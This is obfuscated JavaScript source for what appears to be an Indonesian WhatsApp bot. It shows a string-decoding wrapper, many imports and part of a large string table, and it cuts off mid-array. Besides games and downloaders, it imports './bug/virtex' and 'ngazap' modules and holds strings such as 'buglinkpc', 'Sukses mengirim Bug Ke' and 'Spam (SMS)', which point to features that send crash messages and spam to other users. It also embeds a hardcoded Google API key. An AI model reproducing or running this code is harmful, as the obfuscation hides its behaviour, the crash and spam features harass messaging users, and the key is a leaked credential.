const _0x2dea4c = _0x2dbd;
(function (_0x2b7ba4, _0x49f779) {
    const _0x27f194 = _0x2dbd,
        _0x31dca9 = _0x2b7ba4();
    while (!![]) {
        try {
            const _0xf5a64d = parseInt(_0x27f194(0x17b)) / 0x1 * (parseInt(_0x27f194(0x5ab)) / 0x2) + -parseInt(_0x27f194(0x6da)) / 0x3 * (parseInt(_0x27f194(0xa0d)) / 0x4) + -parseInt(_0x27f194(0x300)) / 0x5 + -parseInt(_0x27f194(0xba5)) / 0x6 * (parseInt(_0x27f194(0x2dd)) / 0x7) + parseInt(_0x27f194(0xd31)) / 0x8 * (-parseInt(_0x27f194(0xb89)) / 0x9) + parseInt(_0x27f194(0x669)) / 0xa + parseInt(_0x27f194(0xac6)) / 0xb * (parseInt(_0x27f194(0x388)) / 0xc);
            if (_0xf5a64d === _0x49f779) break;
            else _0x31dca9['push'](_0x31dca9['shift']());
        } catch (_0x174007) {
            _0x31dca9['push'](_0x31dca9['shift']());
        }
    }
}(_0x220e, 0xc5d5a));
const {
    BufferJSON,
    WA_DEFAULT_EPHEMERAL,
    generateWAMessageFromContent,
    proto,
    generateWAMessageContent,
    generateWAMessage,
    prepareWAMessageMedia,
    downloadContentFromMessage,
    areJidsSameUser,
    getContentType,
    delay
} = require(_0x2dea4c(0xb21)), fs = require('fs'), fetch = (..._0xd521c4) => import('node-fetch')[_0x2dea4c(0xabe)](({
    default: _0x314e6b
}) => _0x314e6b(..._0xd521c4)), translate = require(_0x2dea4c(0x27d)), util = require(_0x2dea4c(0xd2a)), chalk = require(_0x2dea4c(0x30e)), {
    exec,
    spawn,
    execSync
} = require(_0x2dea4c(0x595)), axios = require('axios'), cheerio = require(_0x2dea4c(0x5f9)), cookie = require(_0x2dea4c(0x460)), path = require(_0x2dea4c(0x2c9)), {
    Configuration,
    OpenAIApi
} = require(_0x2dea4c(0x7e6)), os = require('os'), toMS = require('ms'), ms = require(_0x2dea4c(0x389)), nou = require(_0x2dea4c(0x1dd)), kotz = require('kotz-api'), instagramGetUrl = require(_0x2dea4c(0x859)), gtts = require(_0x2dea4c(0x7f2)), bochil = require(_0x2dea4c(0x9dd)), hxz = require('hxz-api'), yts = require(_0x2dea4c(0x2bd)), FormData = require('form-data'), moment = require('moment-timezone'), {
    JSDOM
} = require(_0x2dea4c(0x767)), speed = require(_0x2dea4c(0xad6)), {
    performance
} = require(_0x2dea4c(0x6f7)), {
    sizeFormatter
} = require(_0x2dea4c(0x8f2)), similarity = require('similarity'), threshold = 0.72;
let format = sizeFormatter({
    'std': 'JEDEC',
    'decimalPlaces': 0x2,
    'keepTrailingZeroes': ![],
    'render': (_0x27785c, _0x3549b2) => _0x27785c + ' ' + _0x3549b2 + 'B'
});
var dbs = [];

function _0x2dbd(_0x218a34, _0x3fd572) {
    const _0x220e54 = _0x220e();
    return _0x2dbd = function (_0x2dbd3f, _0x634043) {
        _0x2dbd3f = _0x2dbd3f - 0x12d;
        let _0x496ae5 = _0x220e54[_0x2dbd3f];
        return _0x496ae5;
    }, _0x2dbd(_0x218a34, _0x3fd572);
}
global[_0x2dea4c(0x483)] = dbs;
const _prem = require(_0x2dea4c(0x4d8)),
    _sewa = require(_0x2dea4c(0x8b9)),
    {
        isSetWelcome,
        addSetWelcome,
        changeSetWelcome,
        removeSetWelcome
    } = require('./lib/setwelcome'),
    {
        isSetLeft,
        addSetLeft,
        removeSetLeft,
        changeSetLeft
    } = require('./lib/setleft'),
    {
        getLimit,
        isLimit,
        limitAdd,
        giveLimit,
        addBalance,
        kurangBalance,
        getBalance,
        isGame,
        gameAdd,
        givegame,
        cekGLimit
    } = require('./lib/limit'),
    {
        addResponList,
        delResponList,
        isAlreadyResponList,
        isAlreadyResponListGroup,
        sendResponList,
        updateResponList,
        getDataResponList
    } = require(_0x2dea4c(0x54e)),
    {
        addRespons,
        checkRespons,
        deleteRespons
    } = require(_0x2dea4c(0xa84)),
    {
        isSetProses,
        addSetProses,
        removeSetProses,
        changeSetProses,
        getTextSetProses
    } = require(_0x2dea4c(0xc72)),
    {
        isSetDone,
        addSetDone,
        removeSetDone,
        changeSetDone,
        getTextSetDone
    } = require(_0x2dea4c(0x711)),
    {
        isSetOpen,
        addSetOpen,
        removeSetOpen,
        changeSetOpen,
        getTextSetOpen
    } = require(_0x2dea4c(0x81e)),
    {
        isSetClose,
        addSetClose,
        removeSetClose,
        changeSetClose,
        getTextSetClose
    } = require(_0x2dea4c(0xba7)),
    {
        casinoSave,
        setCasino,
        deleteCasino
    } = require(_0x2dea4c(0xb74)),
    msgFilter = require(_0x2dea4c(0x67f)),
    {
        generateProfilePicture,
        removeEmojis,
        smsg,
        tanggal,
        formatp,
        formatDate,
        getTime,
        isUrl,
        sleep,
        clockString,
        runtime,
        fetchJson,
        getBuffer,
        jsonformat,
        parseMention,
        getRandom,
        getGroupAdmins
    } = require('./lib/myfunc'),
    {
        yta,
        ytv
    } = require(_0x2dea4c(0x489)),
    {
        goLens
    } = require(_0x2dea4c(0xd0b)),
    {
        topUp
    } = require(_0x2dea4c(0xd5c)),
    {
        TelegraPh
    } = require(_0x2dea4c(0x8b6)),
    {
        quote
    } = require(_0x2dea4c(0xad7)),
    {
        pinterest
    } = require(_0x2dea4c(0x37a)),
    {
        TelegraPH
    } = require('./lib/TelegraPH'),
    {
        remini
    } = require(_0x2dea4c(0x39f)),
    {
        virtexnya
    } = require('./bug/virtex'),
    {
        ngazap
    } = require(_0x2dea4c(0x816)),
    {
        virtex
    } = require(_0x2dea4c(0xa85)),
    ffstalk = require(_0x2dea4c(0x504)),
    mlstalk = require(_0x2dea4c(0x392)),
    {
        color,
        bgcolor
    } = require(_0x2dea4c(0xaec)),
    {
        getTextSetWelcome
    } = require('./lib/setwelcome'),
    {
        getTextSetLeft
    } = require(_0x2dea4c(0xc28)),
    afk = require(_0x2dea4c(0x73d)),
    {
        sticker5
    } = require(_0x2dea4c(0xc88));

function _0x220e() {
    const _0x5b1768 = ['changeclose', '.tegem', 'getPremiumPosition', '╭─▸ *LIST HERO*\x0a│\x0a├❖ *LIST*\x0a│1 ▸ *allain*\x0a│2 ▸ *allain-2*\x0a│3 ▸ *kahlii-3*\x0a│4 ▸ *nakroth-4*\x0a│5 ▸ *preyta-2*\x0a│6 ▸ *skud-2*\x0a│7 ▸ *taara-4*\x0a│8 ▸ *valhein-4*\x0a│9 ▸ *arum-4*\x0a│10 ▸ *butterfly-6*\x0a│11 ▸ *capheny-3*\x0a│12 ▸ *elandorr-2*\x0a│13 ▸ *ilumia-3*\x0a│14 ▸ *ishar-4*\x0a│15 ▸ *lauriel-6*\x0a│16 ▸ *laville*\x0a│17 ▸ *liliana-5*\x0a│18 ▸ *nurad-8*\x0a│19 ▸ *quillen-5*\x0a│20 ▸ *rouie*\x0a│21 ▸ *rouie-2*\x0a│22 ▸ *taara-3*\x0a│23 ▸ *telannas-5*\x0a│24 ▸ *yena-4*\x0a│25 ▸ *yena-5*\x0a│26 ▸ *zata*\x0a│27 ▸ *ata*\x0a│28 ▸ *lauriel-5*\x0a│29 ▸ *qi-3*\x0a│30 ▸ *roxie-3*\x0a│31 ▸ *wukong-5*\x0a│32 ▸ *aleister-2*\x0a│33 ▸ *amily-3*\x0a│34 ▸ *arthur-3*\x0a│35 ▸ *arum-3*\x0a│36 ▸ *astrid-2*\x0a│37 ▸ *dirak*\x0a│38 ▸ *dirak-2*\x0a│39 ▸ *grakk-5*\x0a│40 ▸ *hayate-4*\x0a│41 ▸ *ishar-2*\x0a│42 ▸ *ishar-3*\x0a│43 ▸ *jinna-2*\x0a│44 ▸ *keera*\x0a│45 ▸ *keera-3*\x0a│46 ▸ *lauriel-4*\x0a│47 ▸ *nax*\x0a│48 ▸ *natalya-5*\x0a│49 ▸ *quillen-4*\x0a│50 ▸ *raz-3*\x0a│51 ▸ *richter-2*\x0a│52 ▸ *ryoma-4*\x0a│53 ▸ *telannas-4*\x0a│54 ▸ *ulen-6*\x0a│55 ▸ *valhein-3*\x0a│56 ▸ *violet-7*\x0a│57 ▸ *yorn-4*\x0a│58 ▸ *zill-3*\x0a│59 ▸ *ignis-2*\x0a│60 ▸ *lubu-2*\x0a│61 ▸ *naloch-2*\x0a│62 ▸ *sephera-3*\x0a│63 ▸ *butterfly-5*\x0a│64 ▸ *diaochan-4*\x0a│65 ▸ *elandoor*\x0a│66 ▸ *krizzix-2*\x0a│67 ▸ *nina-2*\x0a│68 ▸ *natalya-3*\x0a│69 ▸ *veera-3*\x0a│70 ▸ *violet-6*\x0a│71 ▸ *yena-2*\x0a│72 ▸ *yena-3*\x0a│73 ▸ *krizziz*\x0a│74 ▸ *nurad-7*\x0a│75 ▸ *volkath*\x0a│76 ▸ *volkath-2*\x0a│77 ▸ *airi-4*\x0a│78 ▸ *arduin-3*\x0a│79 ▸ *enzo-3*\x0a│80 ▸ *hayate-3*\x0a│81 ▸ *krixi-3*\x0a│82 ▸ *nurad-6*\x0a│83 ▸ *quillen-3*\x0a│84 ▸ *telannas-3*\x0a│85 ▸ *wisp-2*\x0a│86 ▸ *zip-2*\x0a│87 ▸ *gildur-2*\x0a│88 ▸ *ishar*\x0a│89 ▸ *tulen-5*\x0a│90 ▸ *amily-2*\x0a│91 ▸ *annette-3*\x0a│92 ▸ *arthur-2*\x0a│93 ▸ *butterfly-4*\x0a│94 ▸ *errol-2*\x0a│95 ▸ *joker*\x0a│96 ▸ *kahlii-2*\x0a│97 ▸ *kilgroht*\x0a│98 ▸ *lauriel-3*\x0a│99 ▸ *nurad-5*\x0a│100 ▸ *arduin-2*\x0a│101 ▸ *darcy-2*\x0a│102 ▸ *florentino-3*\x0a│103 ▸ *noren*\x0a│104 ▸ *quillen-2*\x0a│105 ▸ *ryoma-5*\x0a│106 ▸ *sephera-3*\x0a│107 ▸ *violet-5*\x0a│108 ▸ *airi-3*\x0a│109 ▸ *diaochan-3*\x0a│110 ▸ *diaochanlubu*\x0a│111 ▸ *elsuroxie*\x0a│112 ▸ *lindis-3*\x0a│113 ▸ *taara-2*\x0a│114 ▸ *toro-2*\x0a│115 ▸ *tulen-4*\x0a│116 ▸ *violet-4*\x0a│117 ▸ *wonderwoman*\x0a│118 ▸ *ybneth*\x0a│119 ▸ *zill-2*\x0a│120 ▸ *arum-2*\x0a│121 ▸ *florentino-2*\x0a│122 ▸ *liliana-4*\x0a│123 ▸ *nurad-4*\x0a│124 ▸ *yorn-3*\x0a│125 ▸ *zip*\x0a│126 ▸ *annette-2*\x0a│127 ▸ *qi*\x0a│128 ▸ *qi-2*\x0a│129 ▸ *celica*\x0a│130 ▸ *capheny-2*\x0a│131 ▸ *diaochan-2*\x0a│132 ▸ *elsu-2*\x0a│133 ▸ *ilumia-2*\x0a│134 ▸ *krixi-2*\x0a│135 ▸ *narja-2*\x0a│136 ▸ *nurad-3*\x0a│137 ▸ *preyta*\x0a│138 ▸ *telannas-2*\x0a│139 ▸ *valhein*\x0a│140 ▸ *veera-2*\x0a│141 ▸ *veres-2*\x0a│142 ▸ *yorn-2*\x0a│143 ▸ *zephys-2*\x0a│144 ▸ *airi-2*\x0a│145 ▸ *annette*\x0a│146 ▸ *baldum*\x0a│147 ▸ *butterfly-3*\x0a│148 ▸ *elsu-2*\x0a│149 ▸ *errol*\x0a│150 ▸ *fennik*\x0a│151 ▸ *lauriel-2*\x0a│152 ▸ *liliana-2*\x0a│153 ▸ *liliana-3*\x0a│154 ▸ *lindis-2*\x0a│155 ▸ *nurad-2*\x0a│156 ▸ *nakroth-2*\x0a│157 ▸ *nakroth-3*\x0a│158 ▸ *natalya-2*\x0a│159 ▸ *raz-2*\x0a│160 ▸ *ryoma-2*\x0a│161 ▸ *slimz*\x0a│162 ▸ *teemee*\x0a│163 ▸ *tulen-2*\x0a│164 ▸ *tulen-3*\x0a│165 ▸ *violet-3*\x0a│166 ▸ *wiro*\x0a│167 ▸ *wukong-3*\x0a│168 ▸ *wukong-4*\x0a│169 ▸ *zill*\x0a│170 ▸ *aleister*\x0a│171 ▸ *alice*\x0a│172 ▸ *arduin*\x0a│173 ▸ *arthur*\x0a│174 ▸ *azzenka*\x0a│175 ▸ *batman*\x0a│176 ▸ *butterfly-2*\x0a│177 ▸ *cresh*\x0a│178 ▸ *darcy*\x0a│179 ▸ *diaochan*\x0a│180 ▸ *enzo-3*\x0a│181 ▸ *hayate-2*\x0a│182 ▸ *jinna*\x0a│183 ▸ *lubu*\x0a│184 ▸ *nganga*\x0a│185 ▸ *violet-2*\x0a│186 ▸ *wukong-2*\x0a│187 ▸ *zanis-2*\x0a│188 ▸ *florentino*\x0a│189 ▸ *gildur*\x0a│190 ▸ *ignis*\x0a│191 ▸ *naloch*\x0a│192 ▸ *narja*\x0a│193 ▸ *nakroth*\x0a│194 ▸ *omen*\x0a│195 ▸ *payna*\x0a│196 ▸ *raz*\x0a│197 ▸ *rourke*\x0a│198 ▸ *roxie*\x0a│199 ▸ *ryoma*\x0a│200 ▸ *skud*\x0a│201 ▸ *taara*\x0a│202 ▸ *toro*\x0a│203 ▸ *valhein*\x0a│204 ▸ *veres*\x0a│205 ▸ *violet*\x0a│206 ▸ *wisp*\x0a│207 ▸ *wukong*\x0a│208 ▸ *wonderwoman*\x0a│209 ▸ *xeniel*\x0a│210 ▸ *yorn* \x0a│211 ▸ *zanis*\x0a│212 ▸ *elsu*\x0a│213 ▸ *flash*\x0a│214 ▸ *hayate*\x0a│215 ▸ *ilumia*\x0a│216 ▸ *kahlii*\x0a│217 ▸ *Krixi*\x0a│218 ▸ *lauriel*\x0a│219 ▸ *liliana*\x0a│220 ▸ *lindis*\x0a│221 ▸ *nina*\x0a│222 ▸ *nurad*\x0a│223 ▸ *natalya*\x0a│224 ▸ *quillen*\x0a│225 ▸ *richter*\x0a│226 ▸ *sephera*\x0a│227 ▸ *supermen*\x0a│228 ▸ telannas*\x0a│229 ▸ *thane*\x0a│230 ▸ *airi*\x0a│231 ▸ *amily*\x0a│232 ▸ *arum*\x0a│233 ▸ *astrid*\x0a│234 ▸ *butterfly*\x0a│235 ▸ *capheny*\x0a│236 ▸ *enzo*\x0a│237 ▸ *tulen*\x0a│238 ▸ *veera*\x0a│239 ▸ *yena*\x0a│240 ▸ *ryoma-4*\x0a│241 ▸ *zephys*\x0a│242 ▸ *zuka*\x0a│\x0a╰────────────˧', 'https://skizo.tech/api/bard?text=', '#setclose', ' fish 2\x0a 1 Fish = 1500 Money', '╭─▸ *LIST THUMB*\x0a│\x0a├❖ *LIST*\x0a│1 ▸ *mccree*\x0a│2 ▸ *mercy*\x0a│3 ▸ *zenyatta*\x0a│4 ▸ *zarya*\x0a│5 ▸ *winston*\x0a│6 ▸ *widowmaker*\x0a│7 ▸ *tracer*\x0a│8 ▸ *torbjorn*\x0a│9 ▸ *symmetra*\x0a│10 ▸ *sombra*\x0a│11 ▸ *soldier76*\x0a│12 ▸ *soldier_76*\x0a│13 ▸ *roadhog*\x0a│14 ▸ *reinhardt*\x0a│15 ▸ *reaper2*\x0a│16 ▸ *reaper*\x0a│17 ▸ *pharah*\x0a│18 ▸ *orisa*\x0a│19 ▸ *mei*\x0a│20 ▸ *lucio*\x0a│21 ▸ *junkrat*\x0a│22 ▸ *hanzo*\x0a│23 ▸ *genji*\x0a│24 ▸ *dva*\x0a│25 ▸ *bastion*\x0a│26 ▸ *ana2*\x0a│27 ▸ *ana*\x0a│28 ▸ *doomfist*\x0a│29 ▸ *bg-1*\x0a│\x0a╰────────────˧', ' wangyy aku mau nyiumin aroma wangynya ', ' Muhammad', 'Mohon Tunggu Sedang Mencari Partner', 'extendedTextMessage', 'facebook.com', 'Autobio berhasil diaktifkan', 'Reply foto dengan caption ', 'generalexam', 'wallpaperaov', 'Gak Gimana2', 'Jawaban: ', 'quotedMessage', 'country_from', '60 Bulan Lagi', './lib/googlens', 'Sukses change set welcome teks!', 'Masukkan Teks', '\x0a\x0a_____________________________________\x0a\x0a', 'gcwa', ' *url web*\x0aContoh penggunaan : ', 'rating', 'roadw', 'sender', 'sagiri', 'neon2', '```', './datanya/anime/itachi', 'astagfirullah.mp4', 'Maaf ', 'aiimg', ' Detik', 'Pontybridge', 'dragonfire', ' telah kembali dari afk\x0a\x0a*Reason :* ', '*Remaining blood* : ', 'nuliskiri Juna Selebew', '#sticker', 'jhope', '.wav', 'Teka Kimia', 'nuliskiri', 'quotesbucin', '《 ████████████》100%', 'Partner Telah Meninggalkan Sesi Anonymous', '*🐄 Cow* : ', 'util', 'Kuis Math', 'Owner ', 'jarak ', './menu', 'tiktok', 'erofeet', '152176ngFKEs', 'https://telegra.ph/file/c5996d581846f70ed1514.jpg', '*illuminated (Text)*\x0a│11 ▸ ', 'ravines valley', ' Tes', 'Lu Siapa?', 'Mau jual apa?\x0a- fish\x0a- chicken\x0a- rabbit\x0a- sheep\x0a- cow\x0a- elephant\x0a- iron\x0a- gold\x0a- emerald\x0a\x0aExample : ', 'furtext', 'biscuit', ' 12036316943016488', 'Udh off', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36', 'Fall while hunting', 'glowingtext', ' jakarta|bandung', 'Dragontail', '𝑪𝑶𝑴𝑼𝑵𝑰𝑻𝒀 𝑪𝑳𝑨𝒀(𝑪𝒍𝒐𝒘𝒏𝒔 𝑳𝒂𝒖𝒈𝒉 𝑨𝒕 𝒀𝒐𝒖)©️', 'christmasseason', 'hentai', 'type', 'wooden-board', ' *key|response*\x0a\x0a_Contoh_\x0a\x0a', 'tomori', 'listblok', 'balloon5', 'Pesan Yang anda reply tidak mengandung reply', 'deidara', 'Perthlochry', 'avatarLarger', 'Teka Tebakan', '@pesanan', 'multipart/form-data; charset=uttf-8', '(Group: *', ' ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ', 'lanjut', 'prem', 'meme', 'Terdeteksi ', ' (@', '[ ERROR ]', '*glowing-3d (Text)*\x0a│30 ▸ ', '|628xxx|Menfes nih\x0a', '\x0a\x0aKamu dapat membeli limit dengan ', './lib/duniagames', 'trim', './datanya/anime/nezuko', 'milkcake', 'https:', '=> ', 'uranus', '𝐌𝐲𝐬𝐞𝐥𝐟', 'fromObject', './media/sadpodcast/6.mp3', 'Grup Telah Di Buka Oleh Admin\x0aSekarang Semua Member Dapat Mengirim Pesan', 'couple', '.ytegem', './datanya/anime/tsunade', 'ownermenu', 'Sukses!', 'var s=\'', 'Whetstone', 'filter', '\x0a*• Lintang :* ', 'modengold3', 'Tidak', 'mainmenu', 'Tag orangnya', 'Platinum 4', '.sewabot', 'Total : ', 'Maaf Terjadi Kesalahan', 'https://api.zeeoneofc.my.id/api/image-effect/', 'potensi', ' minute(s)', '\x1b[1;31m~\x1b[1;37m>', 'behemoth', 'ice', ' Welcome To Anonymous Chat\x0a\x0a', 'Hillford', 'Glanchester', 'trap', ' https://github.com/juun4/JunaBot-MdV1.1', '#delprem', 'bannerofoverwatch', 'Quotly.webp', 'listcompanylogo2', 'Kameeraska', 'vintagetelevision', '\x0a*Download:* ', 'https://waifu.pics/api/sfw/waifu', 'Dellnort', 'PERMANENT', '55 Hari Lagi', '47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=', '*Sisa Batu:* ', 'yuki', 'groupUpdateDescription', 'pp.mp4', 'Belum ada sesi menfess', 'ytv2', 'Set left already active', 'selectedRowId', 'creator', 'ytegem', 'delsetwelcome', 'Example: ', 'buglinkpc', '16572901099967', 'classic', '「 Group Create Fitur 」\x0a\x0a༫ Subject Group : ', 'gerbil woods', '#nuliskiri', 'templateButtonReplyMessage', 'Autoread berhasil dinonaktifkan', 'pay', 'wait', 'Sukses demote admin✅', 'tupai', '*Congratulation 🎊*', 'Kamu tiba-tiba berubah tanpa sebab tapi jika memang ada sebabnya kamu berubah tolong katakan biar saya perbaiki kesalahan itu', 'Hi ada menfess nih buat kamu\x0a\x0aDari : ', '𝙅𝙖𝙣𝙜𝙖𝙣 𝙨𝙥𝙖𝙢 𝙗𝙤𝙩 𝙮𝙖𝙝𝙝', ' tensei', 'story', '-filter:a \"atempo=1.6,asetrate=22100\"', '_Uppsss... @', 'opentime', ' *text|color*\x0a*Untuk List Color Ketik .list', 'file', 'sgifwm', 'Woodpine', 'jupiter', './datanya/anime/nishimiya', './database/modsNumber.json', 'riri', 'chiltawa woods', 'African forest', ' https://bit.ly/420u6GX', 'Ballaeter', 'winner', 'shinka', ' text1|text2', '「 *TRANSAKSI BERHASIL* 」\x0a\x0a```📆 TANGGAL : @tanggal\x0a⌚ JAM : @jam\x0a✨ STATUS : Berhasil```\x0a\x0aTerimakasih @user Next Order ya🙏', 'Chilliad Dome', ' detik\x0a', 'Ironforge', 'pubgglicthvideo', './datanya/anime/kaguya', 'quotes-underfall', '* copper ore dan ', 'div.BNeawe.deIvCb.AP7Wnd', './datanya/anime/mikasa', 'copyNForward', '\x0a┊ *XP :* ', 'Game berakhir', 'captain_as2', '*💎 Diamond* : ', 'https://telegra.ph/file/91d612a8de859e4e47f30.jpg', 'public', 'indonesia', 'Done Ayangg >///<', '#toimage', 'https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=', '\x0a┊ *Gold :* ', 'Sudbury', ' *@tag/jid*', 'game', 'susunkata', 'rize', 'findIndex', '.ai/', 'https://telegra.ph/file/00018dab77a6cea81523e.jpg', 'totalmem', 'GrandMaster ✩✩', 'end city', 'differentme', 'auto_ai_grup', 'long', ' *text|text2|banner*\x0a*Untuk List Banner Ketik .list', 'Done Ayang>///<', 'terjawab', 'Successfully Activate Auto Downloader', 'Halo ', 'leavegc', '#close', '171631cTDWAx', 'tes', '\x0a ┊ *Iron:* ', 'views', 'announcement', 'self', 'Successfully Disabling Auto Downloader', 'sakura', '] Spam (SMS)', 'Besi Tidak Cukup', '\x0a\x0aKirim perintah .tebakbendera untuk bermain lagi 🎮', 'https://api.nomisec07.site/api/spotify-search?text=', '*?\x0aWaktu : ', 'setppgrup', 'append', ' })()', 'setppgc', '.math medium', '.ttete', '#changeclose', 'Sukses menonaktifkan goodbye di grup ini', '*👥 Tag All By Admin*\x0a \x0a🗞️ *Pesan : ', 'Pergi bukan berarti berhenti mencintai tapi kecewa dan lelah karena harus berjuang sendiri', './media/sadpodcast/2.mp3', 'Kalau aku memang tidak sayang sama kamu ngapain aku mikirin kamu. Tapi semuanya kamu yang ngganggap aku gak sayang sama kamu', 'jid', 'Legends 3', 'title', '*Sukses mengirim Bug Ke ', 'sketch', '\x0a\x0a*Sisa Ore:* ', 'tebakgame', 'embroider', 'setleft', 'Assalamualaikum', 'nsfw_neko', 'angelwing', ' *text|text2|character*\x0a*Untuk List Character Ketik .list', '.ytesi', 'https://skizo.tech/api/ttstalk?user=', 'addfoto', 'manusia-lidi', 'autoblok212', 'tiktokmp4', 'Anda Tidak Memiliki Cukup Ayam Untuk Transaksi Ini', 'Leafy Hollow', 'choices', 'abstra', ' WhatsApp Bot', 'Aku akan ingat kenangan pahit itu dan aku akan jadikan pelajaran untuk masa depan yang manis', 'Aysgarth', '6️⃣', '*── 「 TOPGLOBAL BALANCE 」 ──*\x0a\x0a', 'Apa Arti Dari Simbol : *', '\x0a\x0aUntuk melihat detail produk, silahkan kirim nama produk yang ada pada list di atas. Misalnya kamu ingin melihat detail produk dari ', 'groupParticipantsUpdate', 'WAITING', '《 ████▒▒▒▒▒▒▒▒》30%', '\x0adelay: 500\x0aBERHASIL PUSH', '#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(1)', 'jewelry8', 'Entangled in roots', 'Karenamu aku jadi tau cinta yang sesungguhnya', './database/listcmd.json', 'addAfkUser', 'realistic', 'Ngapain Mau Kirim Ke Creator Gw? Lu Mau Gw Spam?', 'https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaktebakan.json', 'Kirim Perintah ', 'https://skizo.tech/api/aimirrorvip?&apikey=', 'delttc', 'https://skizo.tech/api/openai?apikey=', '9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=', ' 10', 'Sukses reset limit pengguna', '#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(3)', 'status@broadcast', 'Bisa', 'donasi', 'yteka', '_*Random Asmaul Husna*_\x0aAsmaul Husna Ke : ', '\x0aBio Name : ', 'entries', '*Drive Server Info*\x0a\x0a *• Total :* ', 'thumbnail', ' nickname', 'ero', '* Ikan selama 2 menit', 'WebMessageInfo', 'metalb2', 'Id Akun : ', '*Sisa Ingot:* ', ' on -- _mengaktifkan_\x0a', '#antiwame', ' AAAAA LUCCUUUUUUUUUUUUUUU............ ', 'https://api.zeeoneofc.my.id/api/cecan/', '\x0aNickname : ', 'dellist', 'node-os-utils', 'glitter5', 'args :', 'Aku berusaha mendapatkan cinta darimu tetapi Kamunya nggak peka', '*Group Chat*\x0aTotal: ', 'tete', 'mediafire.com', '.ytebe', 'luckytime', 'adventure', 'Night City', 'sheep', 'Berkton', ' *teks*\x0a\x0a_Contoh_\x0a\x0a', 'parseMention', 'shina', 'Yahaha saya ndak bisa di tipu', 'expiredCheck', '*\x0a\x0a_Untuk mengambil audio silahkan kirim pesan sesuai list audio di atas_', 'ohsehun', 'Grasmere', 'image_url', 'moderngold', 'sewabot', '🛍️ MARKET\x0a ┊ Seller : ', 'Random Cogan', './database/mute.json', 'Fort Carson', 'listsewa', 'ffstalk', 'following', 'Message', 'Successfully Disabling Antilink In This Group', 'results', 'keluar -- _keluar dari sesi chat_', 'message', 'male', 'cowo Thailand', 'shift', 'setppbot', '\x0a\x0aKirim perintah .teki untuk bantuan dan .yteki untuk menyerah 🎮', '\x0a⭕: @', '\x0a----------------------------------------\x0a', 'randomanime', 'Akan ada saatnya kok aku akan benar-benar lupa dan tidak memikirkan mu lagi', 'https://skizo.tech/api/simi?&text=', './database/user/darah.json', 'auto_ai_japri', 'hentai_gif', 'Instagram', 'galau', 'gdrivedl', 'jewelry7', 'Masih Ada Sesi Yang Belum Diselesaikan!', './database/user/monay.js', ' itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ', 'Gagal Convert Gambar', 'remini', 'splice', 'Fern Ridge', '_Teman chat telah menghentikan menfess ini_', '*💰 Money* : $', 'metallic2', './media/podcast/5.mp3', 'puppycute', 'pussyart', ')\x0a🎦 Total Video : ', 'listsurat', 'https', '🪵 *Wood* : ', 'mp4', 'Khusus Owner!', 'Saya mencintaimu dan menyayangimu jadi tolong jangan engkau pergi dan meninggalkan ku sendiri', '╭─▸ *LIST THUMB*\x0a│\x0a├❖ *LIST*\x0a│1 ▸ *dragon-5*\x0a│2 ▸ *jet*\x0a│3 ▸ *skull-3*\x0a│4 ▸ *skull-cyborg*\x0a│5 ▸ *tiger-4*\x0a│6 ▸ *bee-3*\x0a│7 ▸ *dragon-4*\x0a│8 ▸ *fox-3*\x0a│9 ▸ *goat-2*\x0a│10 ▸ *kitsune*\x0a│11 ▸ *octopus-2*\x0a│12 ▸ *piranha*\x0a│13 ▸ *assassin*\x0a│14 ▸ *wolf*\x0a│15 ▸ *bear-2*\x0a│16 ▸ *cat*\x0a│17 ▸ *ceberus*\x0a│18 ▸ *crocodile*\x0a│19 ▸ *dinosaur*\x0a│20 ▸ *dragon-3*\x0a│21 ▸ *eagle-3*\x0a│22 ▸ *horse-2*\x0a│23 ▸ *husky*\x0a│24 ▸ *kraken*\x0a│25 ▸ *lynx*\x0a│26 ▸ *sabertooh*\x0a│27 ▸ *sabertooth*\x0a│28 ▸ *shark*\x0a│29 ▸ *tiger*\x0a│30 ▸ *tiger2*\x0a│31 ▸ *tiger3*\x0a│32 ▸ *skull2*\x0a│33 ▸ *scorpion*\x0a│34 ▸ *rounin*\x0a│35 ▸ *octopus*\x0a│36 ▸ *horus*\x0a│37 ▸ *gorilla*\x0a│38 ▸ *fox*\x0a│39 ▸ *demon*\x0a│40 ▸ *cat2*\x0a│41 ▸ *bee*\x0a│42 ▸ *dragon*\x0a│43 ▸ *dragon2*\x0a│44 ▸ *owl*\x0a│45 ▸ *eagle*\x0a│46 ▸ *goat*\x0a│47 ▸ *griffin*\x0a│48 ▸ *horse*\x0a│49 ▸ *hornet*\x0a│50 ▸ *lion*\x0a│51 ▸ *panther*\x0a│52 ▸ *phoenix*\x0a│53 ▸ *puma*\x0a│54 ▸ *rooster*\x0a│55 ▸ *rhino*\x0a│56 ▸ *bee2*\x0a│57 ▸ *devil*\x0a│58 ▸ *cobra*\x0a│59 ▸ *bull*\x0a│60 ▸ *bear*\x0a│61 ▸ *monkey*\x0a│62 ▸ *warrior*\x0a│63 ▸ *rabbit*\x0a│64 ▸ *pirates*\x0a│65 ▸ *owl2*\x0a│66 ▸ *neonwolf*\x0a│67 ▸ *lionking*\x0a│68 ▸ *godzilla*\x0a│69 ▸ *flashwolf*\x0a│70 ▸ *fire*\x0a│71 ▸ *eagle2*\x0a│72 ▸ *dog*\x0a│73 ▸ *mask*\x0a│74 ▸ *team*\x0a│75 ▸ *pubg*\x0a│76 ▸ *drift*\x0a│\x0a╰────────────˧', 'txt2img', 'https://raw.githubusercontent.com/qisyana/scrape/main/tebakgame.json', 'Selamat pagi buat orang yang aku sayang dan orang yang membenciku, semoga hari ini hari yang lebih baik daripada hari kemarin buat aku dan kamu', 'kosaki', 